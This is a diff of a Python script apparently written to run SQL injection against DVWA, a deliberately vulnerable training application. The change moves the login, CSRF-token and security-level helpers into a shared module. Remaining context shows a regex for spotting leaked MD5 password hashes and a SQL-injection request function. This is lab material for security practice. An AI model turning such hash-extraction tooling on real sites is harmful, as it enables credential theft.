@@ -30,6 +30,7 @@ import re
 import sys
 import argparse
 from urllib.parse import urljoin
+from dvwa_common import log, get_csrf_token, login, set_security_level
 
 import requests
 
@@ -47,70 +48,6 @@ ROW_MARKER = "First name:"
 # (DVWA stores passwords unsalted as MD5 at low security) -- a 32-char
 # hex string appearing in the body is a strong, low-false-positive signal.
 MD5_PATTERN = re.compile(r"\b[a-f0-9]{32}\b")
-
-
-def log(msg: str) -> None:
-    print(f"[*] {msg}")
-
-
-def get_csrf_token(html: str) -> str | None:
-    match = re.search(r"name=['\"]user_token['\"]\s+value=['\"]([a-f0-9]+)['\"]", html)
-    return match.group(1) if match else None
-
-
-def login(session: requests.Session, base_url: str, username: str, password: str) -> bool:
-    login_url = urljoin(base_url, "/login.php")
-
-    log(f"Fetching login page: {login_url}")
-    resp = session.get(login_url, timeout=10)
-    resp.raise_for_status()
-
-    token = get_csrf_token(resp.text)
-    if not token:
-        log("Could not locate CSRF token on login page.")
-        return False
-
-    log("Submitting credentials...")
-    payload = {
-        "username": username,
-        "password": password,
-        "Login": "Login",
-        "user_token": token,
-    }
-    resp = session.post(login_url, data=payload, timeout=10, allow_redirects=True)
-    resp.raise_for_status()
-
-    if "login.php" in resp.url:
-        log("Login failed -- still on login.php after submit "
-            "(check credentials, or that the database has been initialized via setup.php).")
-        return False
-
-    log("Login succeeded.")
-    return True
-
-
-def set_security_level(session: requests.Session, base_url: str, level: str) -> bool:
-    security_url = urljoin(base_url, "/security.php")
-
-    resp = session.get(security_url, timeout=10)
-    resp.raise_for_status()
-    token = get_csrf_token(resp.text)
-
-    data = {"security": level, "seclev_submit": "Submit"}
-    if token:
-        data["user_token"] = token
-
-    resp = session.post(security_url, data=data, timeout=10)
-    resp.raise_for_status()
-
-    cookie_level = session.cookies.get("security")
-    if cookie_level != level:
-        log(f"Security cookie is '{cookie_level}', expected '{level}'.")
-        return False
-
-    log(f"Security level set to '{level}'.")
-    return True
-
 
 def send_sqli_request(session: requests.Session, sqli_url: str, id_param: str) -> requests.Response:
     """
